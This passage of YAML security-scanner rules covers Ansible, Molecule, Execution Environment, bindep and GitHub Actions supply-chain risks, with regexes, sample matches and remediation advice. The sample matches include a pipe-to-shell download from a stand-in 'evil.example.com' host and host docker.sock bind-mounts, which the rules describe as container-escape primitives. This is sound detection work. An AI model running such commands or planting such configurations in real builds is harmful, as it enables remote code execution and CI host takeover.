  - id: "role_meta_galaxy_info_missing_license"
    category: "supply_chain"
    severity: "LOW"
    title: "Role meta/main: galaxy_info missing license field"
    description: "galaxy_info has no `license:` key. Roles without a license can't be safely consumed in commercial pipelines - legal risk for the downstream consumer."
    # Assert ``galaxy_info:`` is followed by a block that does NOT
    # contain ``license:`` anywhere in the next 14 lines. The
    # previous regex (``(?:(?!\s*license:)[^\n]*\n){2,15}``) checked
    # only whether the FIRST two lines weren't ``license:``, then
    # succeeded even if ``license:`` appeared later in the block -
    # a classic negative-lookahead-inside-repetition false positive.
    # Using a single whole-window lookahead over the full 14-line
    # span is the right fix: the rule only fires when no
    # ``license:`` key exists anywhere below ``galaxy_info:``.
    regex: "galaxy_info\\s*:\\s*\\n(?!(?:[^\\n]*\\n){0,14}\\s*license\\s*:)(?:[^\\n]*\\n){2,}"
    positive_examples:
      - |2
        galaxy_info:
          role_name: win_dsc
          namespace: win_dsc_ns
          author: example
          description: example
    multiline: true
    window: 30
    recommendation: "Add `license: MIT` (or an SPDX identifier matching your repo's LICENSE file) to galaxy_info."
    cis_controls: ["CIS-Supply-Chain"]
    nist_controls: ['CM-11', 'SA-10', 'SI-7']
    pci_dss: ['6.3.2']
    soc2: ['CC8.1']
    cwe: ['CWE-1104']
    owasp_appsec: ["A06:2021"]
    mitre_attack: ['T1195']

  # -- Molecule scenarios hygiene -----------------------------------------
  # molecule/*/molecule.yml configures test infrastructure. A scenario
  # that mounts the host Docker socket, runs with --privileged, or
  # disables TLS validation on its driver turns test runs into an attack
  # surface (escape from the test container into the CI host).

  - id: "molecule_docker_socket_mount"
    category: "supply_chain"
    severity: "CRITICAL"
    title: "Host docker.sock Bind-Mounted Into a Container or Molecule Scenario"
    description: "A task bind-mounts the host's ``/var/run/docker.sock`` INTO a container or Molecule scenario - e.g. a Molecule ``platforms:`` ``volumes:`` entry, a ``community.docker.docker_container`` ``volumes:`` list, a ``docker run -v /var/run/docker.sock:...`` command, or a ``compose.yaml`` ``volumes:`` declaration. Any process inside the receiving container can then drive the host's Docker daemon (``docker run -v /:/host --privileged ...``) - a full container-escape / host-takeover primitive (MITRE T1610 / T1611). This is distinct from dockerd's OWN listen-address configuration (``ExecStart=/usr/bin/dockerd -H unix:///var/run/docker.sock``) which is NOT a container breakout and is NOT flagged."
    # The previous regex matched ANY mention of ``/var/run/docker.sock``
    # - including dockerd's own listen socket in its unit file, which
    # is a legitimate configuration, not a container escape. Narrow to
    # actual bind-mount shapes:
    #   1. ``docker|podman|nerdctl run -v /var/run/docker.sock:...`` /
    #      ``--volume=/var/run/docker.sock:...``
    #   2. A YAML ``volumes:`` list entry whose string value begins
    #      with ``/var/run/docker.sock`` (Molecule platforms,
    #      community.docker.docker_container, docker-compose).
    #   3. Kubernetes-style ``hostPath: /var/run/docker.sock``.
    regex: "(?:\\b(?:docker|podman|nerdctl)\\s+run\\b[^\\n]*?(?:-v|--volume)[= ]/var/run/docker\\.sock\\b|-\\s*['\\\"]?/var/run/docker\\.sock[:][^\\s'\\\"]*|hostPath\\s*:\\s*['\\\"]?/var/run/docker\\.sock\\b|source\\s*:\\s*['\\\"]?/var/run/docker\\.sock\\b)"
    recommendation: "Never bind-mount the host's docker.sock into a container. For Molecule, use the ``molecule-docker`` driver without a socket mount (the driver talks to Docker via the controller's own client). For docker-in-docker CI runners, use a DinD sidecar (``docker:dind`` with ``privileged: true`` on the sidecar only, or sysbox for rootless DinD). For general container-manages-container workflows, use a rootless runtime or a tightly-scoped Unix socket proxy (e.g. ``tecnativa/docker-socket-proxy``) that only exposes the specific APIs needed."
    positive_examples:
      - "    shell: docker run -v /var/run/docker.sock:/var/run/docker.sock jenkins/jenkins"
      - |2-
              volumes:
                - /var/run/docker.sock:/var/run/docker.sock
      - |2-
            community.docker.docker_container:
              volumes:
                - /var/run/docker.sock:/var/run/docker.sock:ro
      - "      hostPath: /var/run/docker.sock"
    negative_examples:
      - "    ExecStart=/usr/bin/dockerd -H fd:// -H unix:///var/run/docker.sock -H tcp://127.0.0.1:2375"
      - |2-
            ansible.builtin.debug:
              msg: 'dockerd is listening on /var/run/docker.sock'
      - |2-
            ansible.builtin.file:
              path: /var/run/docker.sock
              owner: root
    cis_controls: ["CIS-Docker", "CIS-Supply-Chain"]
    nist_controls: ['AC-3', 'AC-6', 'AC-6(1)', 'CM-11', 'SA-10', 'SI-7']
    pci_dss: ['6.3.2', '7.2.1', '7.2.2']
    hipaa: ['164.312(a)(1)']
    soc2: ['CC6.3', 'CC8.1']
    mitre_attack: ["T1611"]
    cwe: ['CWE-250', 'CWE-732']
    owasp_asvs: [V5.3.1, V13.4.5, V15.2.3]

  - id: "molecule_privileged_container"
    category: "supply_chain"
    severity: "HIGH"
    title: "Molecule: scenario runs a privileged container"
    description: "Molecule scenario platform has `privileged: true`. Every `molecule test` CI job spawns a kernel-capable container, giving any bad role code kernel-level access to the CI host."
    regex: "^\\s*privileged\\s*:\\s*true\\b"
    positive_examples:
      - "privileged: true"
    recommendation: "Remove `privileged: true`. Most Ansible role tests don't need kernel capabilities - if yours does (systemd, mount), prefer `systemd: always` + a tmpfs for /tmp instead."
    cis_controls: ["CIS-Docker"]
    nist_controls: ['AC-6', 'AC-6(1)']
    pci_dss: ['7.2.1']
    soc2: ['CC6.3']
    mitre_attack: ["T1611"]
    cwe: ['CWE-250']
    owasp_asvs: [V13.4.5, V15.2.3]

  - id: "molecule_disable_tls_verify"
    category: "supply_chain"
    severity: "HIGH"
    title: "Molecule: driver TLS verification disabled"
    description: "Molecule driver has `tls_verify: false` (or `verify_ssl: false`). Pulls test images over an MITM-able channel - an attacker on the CI network swaps the image and runs arbitrary code in your test runner."
    regex: "^\\s*(?:tls_verify|verify_ssl|insecure_registry)\\s*:\\s*(?:false|no|\"?0\"?)\\b"
    positive_examples:
      - "tls_verify: false"
    recommendation: "Keep TLS verification on. If you're on a corporate registry with a private CA, inject the CA bundle into the container; never disable verification globally."
    cis_controls: ["CIS-Network"]
    nist_controls: ['SC-8', 'SC-8(1)', 'SC-12']
    pci_dss: ['2.2.7', '4.2.1', '4.2.1.1']
    hipaa: ['164.312(e)(1)', '164.312(e)(2)(ii)']
    soc2: ['CC6.7']
    mitre_attack: ["T1557"]
    cwe: ['CWE-295', 'CWE-319']
    owasp_appsec: ["A02:2021", "A07:2021"]
    owasp_asvs: [V12.2.1, V12.3.4]

  # -- Execution Environment hygiene --------------------------------------
  # ansible-builder uses execution-environment.yml to build AAP EEs. A
  # malformed EE definition bakes a compromised base image or install
  # path into every ad-hoc run on the controller.

  - id: "ee_untrusted_base_image"
    category: "supply_chain"
    severity: "HIGH"
    title: "Execution Environment: non-pinned base image (no digest)"
    description: "execution-environment.yml `images.base_image.name` points at an unpinned or `:latest`-style tag. Every ansible-builder run pulls whatever is live at that tag - a primitive for supply-chain persistence."
    regex: "base_image\\s*:\\s*\\n\\s*name\\s*:\\s*[\"']?[^@\"'\\n]+?(?::(?:latest|[a-z0-9.-]+))?[\"']?\\s*$"
    positive_examples:
      - |2-
        base_image:
            name: "quay.io/ansible/ansible-runner:stable-2.10-devel"
    multiline: true
    window: 3
    recommendation: "Pin to an immutable digest: `name: registry.redhat.io/ansible-automation-platform-24/ee-minimal-rhel9@sha256:<digest>`. Never use a floating tag like `:latest` for a CI-consumed base."
    cis_controls: ["CIS-Supply-Chain"]
    nist_controls: ['CM-11', 'SA-10', 'SI-7']
    pci_dss: ['6.3.2']
    soc2: ['CC7.1', 'CC8.1']
    mitre_attack: ["T1195"]
    cwe: ['CWE-829', 'CWE-1357']
    owasp_appsec: ["A08:2021"]
    owasp_asvs: [V15.2.4]

  - id: "ee_arbitrary_prepend_cmd"
    category: "supply_chain"
    severity: "CRITICAL"
    title: "Execution Environment: additional_build_steps.prepend runs arbitrary shell"
    description: "additional_build_steps.prepend contains a RUN/shell directive that executes during image build. Attacker-controlled values here bake a backdoor into every EE-based ad-hoc run."
    regex: "additional_build_steps\\s*:[\\s\\S]*?prepend\\s*:\\s*(?:\\|\\-?)?\\s*\\n?\\s*(?:RUN|&&|curl|wget)"
    multiline: true
    window: 20
    positive_examples:
      - |2-
        additional_build_steps:
          prepend: |
            RUN curl -sfL https://evil.example.com/install.sh | sh
    recommendation: "Keep additional_build_steps.prepend minimal and reviewable. Any `curl | sh`, `wget | sh`, or pipe-to-shell primitive there is a build-time RCE."
    cis_controls: ["CIS-Supply-Chain"]
    nist_controls: ['CM-11', 'SA-10', 'SI-3', 'SI-7', 'SI-10']
    pci_dss: ['6.2.4', '6.3.1', '6.3.2']
    soc2: ['CC7.1', 'CC8.1']
    mitre_attack: ["T1195.002"]
    cwe: ['CWE-78', 'CWE-829']
    owasp_appsec: ["A03:2021", "A08:2021"]
    owasp_asvs: []

  - id: "ee_additional_build_steps_append_shell"
    category: "supply_chain"
    severity: "CRITICAL"
    title: "Execution Environment: additional_build_steps.append pipes to shell"
    description: "additional_build_steps.append contains a `curl | sh`, `wget | sh`, or equivalent pipe-to-shell primitive. Same threat model as the prepend variant but frequently missed because append runs at the end of the EE build - a compromised append step is a build-time RCE baked into every subsequent ad-hoc run, with the added twist that it's the last thing to run so earlier layers can't be re-used to roll it back."
    regex: "additional_build_steps\\s*:[\\s\\S]{0,1000}?append\\s*:\\s*(?:\\|\\-?)?\\s*\\n?\\s*(?:RUN[^\\n]*\\s+(?:curl|wget)[^\\n]*\\||[^\\n]*curl[^\\n]*\\|\\s*(?:bash|sh))"
    positive_examples:
      - "additional_build_steps:append:RUN curl|"
    multiline: true
    window: 30
    recommendation: "Do not pipe remote content to a shell inside append. If you must install a tool, COPY its signed release artifact into the context via `additional_build_files`, verify its signature/digest in a `RUN` step, and install from the local file. Never `curl | sh` in an EE build."
    cis_controls: ["CIS-Supply-Chain"]
    nist_controls: ['CM-5', 'CM-11', 'SA-10', 'SI-3', 'SI-7', 'SI-10']
    pci_dss: ['6.2.4', '6.3.1', '6.3.2', '6.3.3']
    soc2: ['CC7.1', 'CC8.1']
    mitre_attack: ["T1059.004", "T1195.002"]
    cwe: ['CWE-78', 'CWE-494', 'CWE-829']
    owasp_appsec: ["A03:2021", "A08:2021"]
    owasp_asvs: [V15.2.4]

  - id: "ee_dependencies_galaxy_http"
    category: "supply_chain"
    severity: "HIGH"
    title: "Execution Environment: dependencies.galaxy references HTTP(S) URL"
    description: "The EE's `dependencies.galaxy:` entry points at an HTTP or HTTPS URL instead of a local `requirements.yml` path. ansible-builder fetches the URL contents at build time - a compromised fetch (MITM, cache poisoning, typo-squat, account takeover of the hosting repo) silently changes every collection/role pulled into every EE rebuild, with no audit trail in the EE git repo."
    regex: "dependencies\\s*:[\\s\\S]{0,300}?galaxy\\s*:\\s*(?:['\"]?https?://[^\\s'\"]+|[\\s\\S]{0,400}?-\\s*(?:name|src)\\s*:\\s*['\"]?https?://[^\\s'\"]+)"
    positive_examples:
      - "dependencies:galaxy:http://x"
    multiline: true
    window: 20
    recommendation: "Pin `dependencies.galaxy` to a local file (`galaxy: requirements.yml`) and commit that file alongside the EE definition. Inside the requirements file, pin each collection/role by name + version (`version: 2.9.1`) and, for git-sourced collections, pin to a commit SHA rather than a branch."
    cis_controls: ["CIS-Supply-Chain"]
    nist_controls: ['CM-11', 'SA-10', 'SI-7']
    pci_dss: ['6.3.2']
    soc2: ['CC7.1', 'CC8.1']
    mitre_attack: ["T1195.002"]
    cwe: ['CWE-829', 'CWE-1357']
    owasp_appsec: ["A08:2021"]
    owasp_asvs: [V15.2.4]

  - id: "ee_dependencies_python_unpinned"
    category: "supply_chain"
    severity: "MEDIUM"
    title: "Execution Environment: dependencies.python contains unpinned package"
    description: "The EE's `dependencies.python:` block-scalar includes at least one bare package name (no `==`, `>=`, `~=`, `!=`, or `<=` version constraint). Every EE rebuild resolves the package against the current PyPI index - a single compromised upstream (shai-hulud, ctx/phpass typo-squats) gets baked into the EE and runs on every ad-hoc playbook execution."
    regex: "dependencies\\s*:[\\s\\S]{0,400}?python\\s*:\\s*\\|\\-?\\s*\\n(?:[ \\t]*(?:#[^\\n]*|[A-Za-z0-9_.-]+[ \\t]*(?:[<>=!~][^\\n]*|\\[[^\\n]*\\][<>=!~][^\\n]*)?)\\n)*[ \\t]+[A-Za-z0-9_.-]+[ \\t]*$"
    positive_examples:
      - |-
        dependencies:python:|
         A
    multiline: true
    window: 30
    recommendation: "Pin every package with `==` (exact) in the EE's requirements. Use `pip-compile` to generate a hash-locked requirements file (`--generate-hashes`) and reference that file via `dependencies.python: requirements.txt`. Rebuild the EE only when you intentionally update the lockfile."
    cis_controls: ["CIS-Supply-Chain"]
    nist_controls: ['CM-11', 'SA-10', 'SI-7']
    pci_dss: ['6.3.2']
    soc2: ['CC8.1']
    mitre_attack: ["T1195.002"]
    cwe: ['CWE-1104', 'CWE-1357']
    owasp_appsec: ["A06:2021"]
    owasp_asvs: [V15.2.4]

  - id: "ee_additional_build_files_traversal"
    category: "supply_chain"
    severity: "HIGH"
    title: "Execution Environment: additional_build_files uses path traversal or absolute path"
    description: "`additional_build_files[*].src` uses `../` or an absolute path that escapes the EE's intended build context (anything not under `./`, `./files/`, `./build/`, or `./context/`). ansible-builder copies the referenced files into the image build context; if the path escapes the project directory, a malicious or mis-configured EE can exfiltrate host secrets (`/root/.ssh/`, `/etc/ansible/vault_pass`) or bake a compromised binary from somewhere the build author didn't expect to read from."
    regex: "additional_build_files\\s*:[\\s\\S]{0,500}?src\\s*:\\s*['\"]?(?:\\.\\.\\/|/(?!tmp/|build/|context/))[^'\"\\n]+"
    positive_examples:
      - "additional_build_files:src:../x"
    multiline: true
    window: 30
    recommendation: "Keep every `additional_build_files.src` inside the EE project directory (prefer `files/<name>` or `context/<name>`). If you genuinely need content from outside the tree, stage it into the EE directory in CI (`cp /opt/bin/my-tool files/my-tool`) before calling `ansible-builder build`, so the EE definition itself references only paths that a reviewer can audit in Git."
    cis_controls: ["CIS-Supply-Chain"]
    nist_controls: ['CM-11', 'SA-10', 'SI-7']
    pci_dss: ['6.3.2']
    soc2: ['CC7.1', 'CC8.1']
    mitre_attack: ["T1195.002"]
    cwe: ['CWE-22', 'CWE-829']
    owasp_appsec: ["A01:2021", "A08:2021"]
    owasp_asvs: [V5.3.2, V1.2.5]

  - id: "ee_build_arg_secret"
    category: "supply_chain"
    severity: "HIGH"
    title: "Execution Environment: ARG exposes credential-shaped variable"
    description: "The EE's Containerfile (or ansible-builder additional_build_steps) declares `ARG` for a variable whose name contains SECRET/TOKEN/API_KEY/PASSWORD. Values passed via `--build-arg` are persisted in every image layer's metadata and are trivially extracted with `docker history --no-trunc <image>` or `podman image inspect`. Any downstream consumer of the EE image sees the secret, and it ends up in every EE registry push."
    regex: "(?:^|\\n)\\s*ARG\\s+(?:[A-Z0-9_]*(?:SECRET|TOKEN|API_KEY|APIKEY|PASSWORD|PASSWD)[A-Z0-9_]*)\\s*(?:=|$)"
    positive_examples:
      - |-
        
        ARG SECRET=
    multiline: true
    window: 2
    recommendation: "Never pass secrets via `ARG`. Use BuildKit secret mounts: `RUN --mount=type=secret,id=mytoken,target=/run/secrets/mytoken ...` and supply the secret via `--secret id=mytoken,src=./tokenfile`. The secret is available only for that RUN and is not persisted into the image. For ansible-builder specifically, move the secret-requiring step into CI (clone/download before the builder call) so the EE build never sees the secret."
    cis_controls: ["CIS-16.4", "CIS-Supply-Chain"]
    nist_controls: ['AC-3', 'CM-11', 'IA-5', 'IA-5(7)', 'SA-10', 'SA-11', 'SC-28', 'SI-2', 'SI-7']
    pci_dss: ['3.3.1', '3.5.1', '6.3.2', '6.3.3', '8.6.2', '11.3.1']
    hipaa: ['164.312(a)(1)', '164.312(a)(2)(i)', '164.312(a)(2)(iv)', '164.312(d)', '164.312(e)(1)']
    soc2: ['C1.1', 'CC6.1', 'CC6.7', 'CC7.1', 'CC8.1']
    mitre_attack: ["T1552.001", "T1552.007"]
    cwe: ['CWE-200', 'CWE-522', 'CWE-798']
    owasp_appsec: ["A01:2021", "A04:2021", "A07:2021"]
    owasp_asvs: [V13.2.1, V13.2.3, V13.3.1, V11.2.5, V14.2.2]

  # -- Bindep hygiene -----------------------------------------------------
  # bindep.txt lists system packages ansible-builder installs into the EE.
  # An unconstrained entry pulls whatever the distro publishes at build
  # time; combined with a floating base image, this is a full supply-chain
  # drift vector.

  - id: "bindep_unpinned_package"
    category: "supply_chain"
    severity: "MEDIUM"
    title: "bindep.txt: system package without a version constraint or platform tag"
    description: "A bindep.txt entry is a bare package name with no platform tag (`[platform:rpm]`) and no version constraint. Future EE rebuilds pull whatever the distro publishes at that moment."
    regex: "^\\s*[a-zA-Z0-9._-]{2,}\\s*\\[platform:[a-z]+\\]\\s*$"
    positive_examples:
      - "git-core [platform:rpm]"
    recommendation: "Add a version constraint alongside the platform tag: `openssl [platform:rpm >=3.0.7]`. Unconstrained entries silently drift across rebuilds."
    cis_controls: ["CIS-Supply-Chain"]
    nist_controls: ['CM-11', 'SA-10', 'SI-7']
    pci_dss: ['6.3.2']
    soc2: ['CC8.1']
    cwe: ['CWE-1357']
    owasp_asvs: [V15.2.4]
    mitre_attack: ['T1195.002']

  - id: "bindep_profile_runs_shell"
    category: "supply_chain"
    severity: "CRITICAL"
    title: "bindep profile executes a shell primitive at build time"
    description: "A bindep.txt line contains `$(...)`, backticks, or pipe-to-shell. bindep evaluates these, so this line runs arbitrary shell during every EE build - a persistent RCE primitive."
    # Anchor on bindep-line shape: a bare package-like identifier at
    # line start (allowing leading whitespace for embedded bindep
    # content inside ``copy.content: |`` blocks) optionally followed
    # by a ``[platform:...]`` tag, then a shell primitive. Per-line
    # scanning already anchors ``^`` to the start of each line, so no
    # inline ``(?m)`` flag is needed. Excluding ``#`` via negative
    # lookahead guarantees YAML comments with backtick-quoted code
    # spans (``# use ``foo`` here``) can never match; requiring a
    # bindep-legal token rejects plain URLs or symbol-only lines.
    regex: "^[\\t ]*(?!#)[a-zA-Z0-9][a-zA-Z0-9._+\\-]*(?:\\s+\\[[^\\]]+\\])?\\s*(?:\\$\\(|`[^`]+`|\\|\\s*(?:sh|bash|zsh)\\b)"
    positive_examples:
      - "than `::new()`"
    recommendation: "bindep entries must be pure package names + platform tags. Remove any shell primitive. If you genuinely need a preflight script, put it in execution-environment.yml's `additional_build_steps` (which is at least reviewable)."
    cis_controls: ["CIS-Supply-Chain"]
    nist_controls: ['CM-11', 'SA-10', 'SI-3', 'SI-7', 'SI-10']
    pci_dss: ['6.2.4', '6.3.1', '6.3.2']
    soc2: ['CC7.1', 'CC8.1']
    mitre_attack: ["T1059"]
    cwe: ['CWE-78', 'CWE-94']
    owasp_appsec: ["A03:2021"]

  # -- CI/CD self-modification ----------------------------------------------

  - id: "gh_actions_unpinned_sha"
    category: "supply_chain"
    severity: "HIGH"
    title: "GitHub Actions Third-Party Step Not Pinned to a SHA"
    description: "A workflow references a third-party action by mutable tag (`uses: owner/action@v1`, `@main`, `@master`, `@latest`) instead of a 40-character commit SHA. Any compromise of the action's tag - including a retag by a malicious maintainer - silently lands in every subsequent run (tj-actions/changed-files 2025 was precisely this pattern)."
    regex: "^\\s*(?:-\\s+)?uses:\\s*[\"']?(?!actions/|github/|docker/login-action|\\./|[A-Za-z0-9._-]+/[A-Za-z0-9._-]+@[a-f0-9]{40}\\b)[A-Za-z0-9._-]+/[A-Za-z0-9._-]+@(?:v?\\d[\\w.-]*|main|master|latest|HEAD|develop)[\"']?"
    positive_examples:
      - "uses: ansible-community/antsibull-nox@main"
    multiline: true
    window: 2
    recommendation: "Pin every third-party action to a full 40-character commit SHA: `uses: tj-actions/changed-files@a284dc1814e3fe7ab40ebf11b00c5ad83d5c9b74  # v45.0.4`. Keep the tag in a trailing comment for readability. Automate SHA updates with Dependabot (`updates.directory: /.github/workflows` + `open-pull-requests-limit`) - the pin is updated in PR form, not by a mutable tag lookup."
